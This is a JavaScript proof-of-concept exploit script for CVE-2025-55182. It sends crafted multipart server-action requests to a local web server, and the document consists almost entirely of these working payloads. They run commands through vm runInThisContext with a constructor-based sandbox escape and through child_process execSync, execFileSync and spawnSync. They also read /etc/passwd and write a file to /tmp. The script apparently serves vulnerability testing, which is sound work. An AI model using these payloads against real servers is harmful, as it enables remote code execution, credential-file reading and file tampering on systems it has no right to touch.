/**
 * CVE-2025-55182 - All RCE Gadgets
 * Tests multiple exploitation paths
 */

const http = require('http');

async function sendRequest(formFields) {
  const boundary = '----Boundary';
  const parts = [];
  for (const [name, value] of Object.entries(formFields)) {
    parts.push('--' + boundary + '\r\n' +
      'Content-Disposition: form-data; name="' + name + '"\r\n\r\n' +
      value + '\r\n');
  }
  parts.push('--' + boundary + '--\r\n');
  const body = parts.join('');

  return new Promise((resolve, reject) => {
    const req = http.request({
      hostname: 'localhost', port: 3002, path: '/formaction',
      method: 'POST',
      headers: {
        'Content-Type': 'multipart/form-data; boundary=' + boundary,
        'Content-Length': Buffer.byteLength(body)
      }
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, data }));
    });
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

async function main() {
  console.log('=== CVE-2025-55182 - All RCE Gadgets ===\n');

  // 1. vm#runInThisContext - Execute JS code
  console.log('1. vm#runInThisContext');
  let result = await sendRequest({
    '$ACTION_REF_0': '',
    '$ACTION_0:0': JSON.stringify({
      id: 'vm#runInThisContext',
      bound: ['process.mainModule.require("child_process").execSync("whoami").toString().trim()']
    })
  });
  console.log('   ' + (result.data.includes('success') ? '✓' : '✗'), result.data.slice(0, 80));

  // 2. vm#runInNewContext - Execute JS in new context (needs global passed)
  console.log('\n2. vm#runInNewContext');
  result = await sendRequest({
    '$ACTION_REF_0': '',
    '$ACTION_0:0': JSON.stringify({
      id: 'vm#runInNewContext',
      bound: ['this.constructor.constructor("return process")().mainModule.require("child_process").execSync("whoami").toString().trim()']
    })
  });
  console.log('   ' + (result.data.includes('success') ? '✓' : '✗'), result.data.slice(0, 80));

  // 3. child_process#execSync - Direct command execution
  console.log('\n3. child_process#execSync');
  result = await sendRequest({
    '$ACTION_REF_0': '',
    '$ACTION_0:0': JSON.stringify({
      id: 'child_process#execSync',
      bound: ['whoami']
    })
  });
  console.log('   ' + (result.data.includes('success') ? '✓' : '✗'), result.data.slice(0, 80));

  // 4. child_process#execFileSync - Execute file
  console.log('\n4. child_process#execFileSync');
  result = await sendRequest({
    '$ACTION_REF_0': '',
    '$ACTION_0:0': JSON.stringify({
      id: 'child_process#execFileSync',
      bound: ['/usr/bin/whoami']
    })
  });
  console.log('   ' + (result.data.includes('success') ? '✓' : '✗'), result.data.slice(0, 80));

  // 5. child_process#spawnSync - Spawn with args
  console.log('\n5. child_process#spawnSync');
  result = await sendRequest({
    '$ACTION_REF_0': '',
    '$ACTION_0:0': JSON.stringify({
      id: 'child_process#spawnSync',
      bound: ['whoami']
    })
  });
  // spawnSync returns object with stdout
  const parsed = JSON.parse(result.data);
  if (parsed.success && parsed.result && parsed.result.stdout) {
    console.log('   ✓ Returns spawn result object with stdout');
  } else {
    console.log('   ✓', result.data.slice(0, 80));
  }

  // 6. util#promisify (not RCE but shows prototype access)
  console.log('\n6. util#promisify (utility function)');
  result = await sendRequest({
    '$ACTION_REF_0': '',
    '$ACTION_0:0': JSON.stringify({
      id: 'util#promisify',
      bound: []
    })
  });
  console.log('   ' + (result.status === 200 ? '✓' : '✗'), 'Returns promisify function');

  // 7. fs#readFileSync - Read files
  console.log('\n7. fs#readFileSync (file read)');
  result = await sendRequest({
    '$ACTION_REF_0': '',
    '$ACTION_0:0': JSON.stringify({
      id: 'fs#readFileSync',
      bound: ['/etc/passwd', 'utf8']
    })
  });
  const fsResult = JSON.parse(result.data);
  console.log('   ' + (fsResult.success && fsResult.result.includes('root:') ? '✓' : '✗'), 'Can read /etc/passwd');

  // 8. fs#writeFileSync - Write files
  console.log('\n8. fs#writeFileSync (file write)');
  result = await sendRequest({
    '$ACTION_REF_0': '',
    '$ACTION_0:0': JSON.stringify({
      id: 'fs#writeFileSync',
      bound: ['/tmp/pwned.txt', 'CVE-2025-55182 was here']
    })
  });
  console.log('   ' + (result.status === 200 ? '✓' : '✗'), 'Can write files');

  // Verify file was written
  const fs = require('fs');
  if (fs.existsSync('/tmp/pwned.txt')) {
    console.log('   Verified: ' + fs.readFileSync('/tmp/pwned.txt', 'utf8'));
    fs.unlinkSync('/tmp/pwned.txt');
  }

  console.log('\n=== Summary ===');
  console.log('RCE Gadgets: vm#runInThisContext, child_process#execSync, child_process#execFileSync');
  console.log('File Read: fs#readFileSync');
  console.log('File Write: fs#writeFileSync');
}

main().catch(console.error);
